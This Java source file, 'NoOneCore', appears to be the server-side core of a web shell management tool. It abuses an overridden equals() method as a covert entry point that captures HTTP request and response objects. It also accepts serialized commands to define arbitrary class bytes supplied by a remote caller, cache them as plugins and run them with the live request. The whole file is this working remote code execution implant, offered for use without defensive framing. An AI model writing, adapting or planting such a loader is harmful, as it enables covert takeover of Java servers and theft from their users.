package com.reajason.noone.core;

import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * @author ReaJason
 * @since 2025/8/29
 */
public class NoOneCore extends URLClassLoader {

    private static final String ACTION = "action";
    private static final String CLASSNAME = "className";
    private static final String PLUGIN = "plugin";
    private static final String PLUGIN_BYTES = "pluginBytes";
    private static final String VERSION = "version";
    private static final String ARGS = "args";

    private static final String REFRESH = "refresh";
    private static final String CLASS_DEFINE = "classDefine";
    private static final String CLASS_RUN = "classRun";
    private static final String PLUGIN_CACHES = "pluginCaches";
    private static final String GLOBAL_CACHES = "globalCaches";
    // Plugin contract v2: plugins implement Object execute(Map ctx) and return
    // their result. No result key is written back into ctx.
    private static final String PLUGIN_EXECUTE = "execute";
    private static final String REQUEST = "request";
    private static final String RESPONSE = "response";

    private static final String ACTION_STATUS = "status";
    private static final String ACTION_RUN = "run";
    private static final String ACTION_LOAD = "load";
    private static final String ACTION_CLEAN = "clean";

    private static final String CODE = "code";
    private static final String ERROR = "error";
    private static final String DATA = "data";
    private static final int SUCCESS = 0;
    private static final int FAILURE = 1;

    // pluginName to pluginObject
    public static final Map<String, Object> loadedPluginCache = new ConcurrentHashMap<>();
    public static final Map<String, String> loadedPluginVersionCache = new ConcurrentHashMap<>();
    public static final Map<String, Object> globalCaches = new ConcurrentHashMap<>();
    // plugin class to its resolved execute(Map) method
    private static final Map<Class<?>, Method> pluginExecuteCache = new ConcurrentHashMap<>();

    private static volatile NoOneCore pluginClassLoader;

    public NoOneCore() {
        super(new URL[0]);
    }

    public NoOneCore(ClassLoader parent) {
        super(new URL[0], parent);
    }

    private static NoOneCore getPluginClassLoader() {
        if (pluginClassLoader == null) {
            synchronized (NoOneCore.class) {
                if (pluginClassLoader == null) {
                    pluginClassLoader = new NoOneCore(Thread.currentThread().getContextClassLoader());
                }
            }
        }
        return pluginClassLoader;
    }

    private Object req;
    private Object res;

    @Override
    public boolean equals(Object obj) {
        Object[] ctx = (Object[]) obj;
        if (!(ctx[1] instanceof OutputStream)) {
            req = ctx[0];
            res = ctx[1];
            return false;
        }
        byte[] inputBytes = (byte[]) ctx[0];
        OutputStream outputStream = (OutputStream) ctx[1];
        Map<String, Object> result = new LinkedHashMap<>();
        result.put(CODE, SUCCESS);
        Map<String, Object> args = new HashMap<>();
        try {
            args = deserialize(inputBytes);
        } catch (Throwable e) {
            result.put(CODE, FAILURE);
            result.put(ERROR, getStackTraceAsString(new RuntimeException("args parsed failed, " + e.getMessage(), e)));
        }
        String action = (String) args.get(ACTION);
        if (action != null) {
            try {
                switch (action) {
                    case ACTION_STATUS:
                        result.putAll(getStatus());
                        break;
                    case ACTION_RUN:
                        result.putAll(run(args));
                        break;
                    case ACTION_LOAD:
                        Object loaded = load(args, result);
                        result.put(DATA, loaded != null);
                        break;
                    case ACTION_CLEAN:
                        for (Object service : globalCaches.values()) {
                            try {
                                Map<String, Object> shutdownCtx = new HashMap<>();
                                shutdownCtx.put("op", "shutdown");
                                invokeExecute(service, shutdownCtx);
                            } catch (Throwable ignored) {
                            }
                        }
                        globalCaches.clear();
                        loadedPluginCache.clear();
                        loadedPluginVersionCache.clear();
                        pluginExecuteCache.clear();
                        pluginClassLoader = null;
                        break;
                    default:
                        result.put(CODE, FAILURE);
                        result.put(ERROR, "action [" + action + "] not supported");
                        break;
                }
            } catch (Throwable e) {
                result.put(CODE, FAILURE);
                result.put(ERROR, getStackTraceAsString(new RuntimeException("action [" + action + "] run failed, " + e.getMessage(), e)));
            }
        }
        try {
            byte[] bytes = serialize(result);
            outputStream.write(bytes, 0, bytes.length);
            outputStream.flush();
            outputStream.close();
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return true;
    }

    private Class<?> defineClass(String className, byte[] bytes) {
        return super.defineClass(className, bytes, 0, bytes.length);
    }

    /**
     * Resolves the plugin entry point: {@code public Object execute(Map ctx)}.
     * Cached per plugin class because the core instance is created per request.
     */
    private static Method resolveExecuteMethod(Object pluginObj) {
        Class<?> pluginClass = pluginObj.getClass();
        Method method = pluginExecuteCache.get(pluginClass);
        if (method != null) {
            return method;
        }
        try {
            method = pluginClass.getDeclaredMethod(PLUGIN_EXECUTE, Map.class);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException("plugin [" + pluginClass.getName()
                    + "] does not implement execute(Map); regenerate it for this core version", e);
        }
        method.setAccessible(true);
        pluginExecuteCache.put(pluginClass, method);
        return method;
    }

    /**
     * Invokes a plugin and returns its result. Plugin exceptions are unwrapped
     * so callers see the originating stack trace.
     */
    private static Object invokeExecute(Object pluginObj, Map<String, Object> ctx) {
        try {
            return resolveExecuteMethod(pluginObj).invoke(pluginObj, ctx);
        } catch (InvocationTargetException e) {
            Throwable cause = e.getCause();
            if (cause instanceof RuntimeException) {
                throw (RuntimeException) cause;
            }
            if (cause instanceof Error) {
                throw (Error) cause;
            }
            throw new RuntimeException(cause);
        } catch (IllegalAccessException e) {
            throw new RuntimeException("cannot access plugin execute(Map): " + e.getMessage(), e);
        }
    }

    public Map<String, Object> getStatus() {
        Map<String, Object> result = new HashMap<>();
        result.put(PLUGIN_CACHES, loadedPluginVersionCache);
        result.put(GLOBAL_CACHES, globalCaches.keySet());
        return result;
    }

    public Object load(Map<String, Object> args, Map<String, Object> result) throws Exception {
        String plugin = (String) args.get(PLUGIN);
        String className = (String) args.get(CLASSNAME);
        byte[] pluginBytes = (byte[]) args.get(PLUGIN_BYTES);
        String version = asString(args.get(VERSION));
        boolean refresh = asBoolean(args.get(REFRESH));

        if (!refresh && plugin != null) {
            Object cached = loadedPluginCache.get(plugin);
            if (cached != null) {
                return cached;
            }
        }

        if (className == null || className.isEmpty()) {
            throw new RuntimeException("className is required for class loading");
        }
        if (pluginBytes == null || pluginBytes.length == 0) {
            throw new RuntimeException("pluginBytes is required for class loading");
        }

        NoOneCore loader = getPluginClassLoader();

        if (refresh) {
            Object pluginObj = loader.defineClass(className, pluginBytes)
                    .getDeclaredConstructor().newInstance();
            pluginExecuteCache.clear();
            resolveExecuteMethod(pluginObj);
            loadedPluginCache.put(plugin, pluginObj);
            loadedPluginVersionCache.put(plugin, version);
            result.put(CLASS_DEFINE, true);
            return pluginObj;
        }

        synchronized (loadedPluginCache) {
            Object pluginObj = loadedPluginCache.get(plugin);
            if (pluginObj == null) {
                pluginObj = loader.defineClass(className, pluginBytes)
                        .getDeclaredConstructor().newInstance();
                resolveExecuteMethod(pluginObj);
                loadedPluginCache.put(plugin, pluginObj);
                loadedPluginVersionCache.put(plugin, version);
                result.put(CLASS_DEFINE, true);
            }
            return pluginObj;
        }
    }


    @SuppressWarnings("unchecked")
    public Map<String, Object> run(Map<String, Object> args) {
        Map<String, Object> result = new HashMap<>();
        String plugin = (String) args.get(PLUGIN);
        Object pluginObj = loadedPluginCache.get(plugin);
        if (pluginObj == null) {
            throw new RuntimeException("plugin [" + plugin + "] not found");
        }
        Map<String, Object> input = (Map<String, Object>) args.get(ARGS);
        // Never mutate the caller's argument map; reserved runtime keys live
        // only in the per-invocation context.
        Map<String, Object> ctx = input == null
                ? new HashMap<String, Object>()
                : new HashMap<String, Object>(input);
        ctx.put(PLUGIN_CACHES, loadedPluginCache);
        ctx.put(GLOBAL_CACHES, globalCaches);
        ctx.put(REQUEST, req);
        ctx.put(RESPONSE, res);
        result.put(DATA, invokeExecute(pluginObj, ctx));
        result.put(CLASS_RUN, true);
        return result;
    }

    public static byte[] toByteArray(InputStream input) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];
        int len;
        try {
            while ((len = input.read(buffer)) != -1) {
                baos.write(buffer, 0, len);
            }
        } catch (IOException ignored) {
        } finally {
            if (input != null) {
                try {
                    input.close();
                } catch (IOException ignored) {
                }
            }
        }
        return baos.toByteArray();
    }

    private boolean asBoolean(Object value) {
        if (value instanceof Boolean) {
            return (Boolean) value;
        }
        return Boolean.parseBoolean(asString(value));
    }

    private String asString(Object value) {
        return value == null ? null : String.valueOf(value);
    }

    static final byte NULL = 0x00;
    static final byte STRING = 0x01;
    static final byte INTEGER = 0x02;
    static final byte LONG = 0x03;
    static final byte DOUBLE = 0x04;
    static final byte BOOLEAN = 0x05;
    static final byte BYTE_ARRAY = 0x06;
    static final byte LIST = 0x7;
    static final byte OBJECT_ARRAY = 0x8;
    static final byte SET = 0x09;
    // Strings whose modified UTF-8 representation exceeds MAX_UTF_LENGTH bytes
    // are written with an int length and standard UTF-8 instead of writeUTF.
    static final byte LONG_STRING = 0x0A;
    static final byte MAP = 0x10;
    static final int MAX_UTF_LENGTH = 0xffff;
    // Initial capacity cap for collections read from the wire, so a malicious
    // size prefix cannot trigger a huge eager allocation.
    private static final int INITIAL_CAPACITY_LIMIT = 1024;

    public byte[] serialize(Map<String, Object> map) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream dos = new DataOutputStream(baos);
        writeMap(dos, map);
        return baos.toByteArray();
    }

    public Map<String, Object> deserialize(byte[] data) throws IOException {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        DataInputStream dis = new DataInputStream(bais);
        byte type = dis.readByte();
        if (type == MAP) {
            return readMap(dis);
        } else {
            throw new IOException("Root object is not a Map.");
        }
    }

    private void writeMap(DataOutputStream dos, Map<String, Object> map) throws IOException {
        dos.writeByte(MAP);
        if (map == null) {
            dos.writeInt(0);
            return;
        }
        dos.writeInt(map.size());
        for (Map.Entry<String, Object> entry : map.entrySet()) {
            dos.writeUTF(entry.getKey());
            writeObject(dos, entry.getValue());
        }
    }

    private void writeObject(DataOutputStream dos, Object obj) throws IOException {
        if (obj == null) {
            dos.writeByte(NULL);
        } else if (obj instanceof String) {
            writeStringObject(dos, (String) obj);
        } else if (obj instanceof Integer) {
            dos.writeByte(INTEGER);
            dos.writeInt((Integer) obj);
        } else if (obj instanceof Long) {
            dos.writeByte(LONG);
            dos.writeLong((Long) obj);
        } else if (obj instanceof Double) {
            dos.writeByte(DOUBLE);
            dos.writeDouble((Double) obj);
        } else if (obj instanceof Boolean) {
            dos.writeByte(BOOLEAN);
            dos.writeBoolean((Boolean) obj);
        } else if (obj instanceof byte[]) {
            dos.writeByte(BYTE_ARRAY);
            byte[] bytes = (byte[]) obj;
            dos.writeInt(bytes.length);
            dos.write(bytes);
        } else if (obj instanceof Set) {
            dos.writeByte(SET);
            Set<?> set = (Set<?>) obj;
            dos.writeInt(set.size());
            for (Object item : set) {
                writeObject(dos, item);
            }
        } else if (obj instanceof List) {
            dos.writeByte(LIST);
            List<?> list = (List<?>) obj;
            dos.writeInt(list.size());
            for (Object item : list) {
                writeObject(dos, item);
            }
        } else if (obj instanceof Object[]) {
            dos.writeByte(OBJECT_ARRAY);
            Object[] array = (Object[]) obj;
            dos.writeInt(array.length);
            for (Object item : array) {
                writeObject(dos, item);
            }
        } else if (obj instanceof Map) {
            @SuppressWarnings("unchecked")
            Map<String, Object> subMap = (Map<String, Object>) obj;
            writeMap(dos, subMap);
        } else {
            throw new IllegalArgumentException("Unsupported type for serialization: " + obj.getClass().getName());
        }
    }

    private Map<String, Object> readMap(DataInputStream dis) throws IOException {
        int size = readCollectionSize(dis, "map");
        Map<String, Object> map = new HashMap<>(Math.min(size, INITIAL_CAPACITY_LIMIT));
        for (int i = 0; i < size; i++) {
            String key = dis.readUTF();
            Object value = readObject(dis);
            map.put(key, value);
        }
        return map;
    }

    private Object readObject(DataInputStream dis) throws IOException {
        byte type = dis.readByte();
        switch (type) {
            case NULL:
                return null;
            case STRING:
                return dis.readUTF();
            case LONG_STRING:
                return readLongString(dis);
            case INTEGER:
                return dis.readInt();
            case LONG:
                return dis.readLong();
            case DOUBLE:
                return dis.readDouble();
            case BOOLEAN:
                return dis.readBoolean();
            case BYTE_ARRAY:
                int len = readLength(dis, "byte array");
                byte[] bytes = new byte[len];
                dis.readFully(bytes);
                return bytes;
            case SET:
                int setSize = readCollectionSize(dis, "set");
                Set<Object> set = new LinkedHashSet<>(Math.min(setSize, INITIAL_CAPACITY_LIMIT));
                for (int i = 0; i < setSize; i++) {
                    set.add(readObject(dis));
                }
                return set;
            case LIST:
                int listSize = readCollectionSize(dis, "list");
                List<Object> list = new ArrayList<>(Math.min(listSize, INITIAL_CAPACITY_LIMIT));
                for (int i = 0; i < listSize; i++) {
                    list.add(readObject(dis));
                }
                return list;
            case OBJECT_ARRAY:
                int arrayLength = readCollectionSize(dis, "array");
                Object[] array = new Object[arrayLength];
                for (int i = 0; i < arrayLength; i++) {
                    array[i] = readObject(dis);
                }
                return array;
            case MAP:
                return readMap(dis);
            default:
                throw new IOException("Unknown data type found in stream: " + type);
        }
    }

    private void writeStringObject(DataOutputStream dos, String value) throws IOException {
        if (modifiedUtfLength(value) <= MAX_UTF_LENGTH) {
            dos.writeByte(STRING);
            dos.writeUTF(value);
            return;
        }

        byte[] bytes = value.getBytes("UTF-8");
        dos.writeByte(LONG_STRING);
        dos.writeInt(bytes.length);
        dos.write(bytes);
    }

    private String readLongString(DataInputStream dis) throws IOException {
        int length = readLength(dis, "string");
        byte[] bytes = new byte[length];
        dis.readFully(bytes);
        return new String(bytes, "UTF-8");
    }

    private int modifiedUtfLength(String value) {
        long length = 0;
        for (int i = 0; i < value.length(); i++) {
            int c = value.charAt(i);
            if (c >= 0x0001 && c <= 0x007f) {
                length++;
            } else if (c > 0x07ff) {
                length += 3;
            } else {
                length += 2;
            }
            if (length > MAX_UTF_LENGTH) {
                return MAX_UTF_LENGTH + 1;
            }
        }
        return (int) length;
    }

    private int readLength(DataInputStream dis, String what) throws IOException {
        int length = dis.readInt();
        if (length < 0) {
            throw new IOException("Negative " + what + " length: " + length);
        }
        if (length > dis.available()) {
            throw new IOException("Declared " + what + " length " + length
                    + " exceeds remaining " + dis.available() + " bytes");
        }
        return length;
    }

    private int readCollectionSize(DataInputStream dis, String what) throws IOException {
        int size = dis.readInt();
        if (size < 0) {
            throw new IOException("Negative " + what + " size: " + size);
        }
        if (size > dis.available()) {
            throw new IOException("Declared " + what + " size " + size
                    + " exceeds remaining " + dis.available() + " bytes");
        }
        return size;
    }

    private String getStackTraceAsString(Throwable throwable) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        throwable.printStackTrace(pw);
        return sw.toString();
    }
}
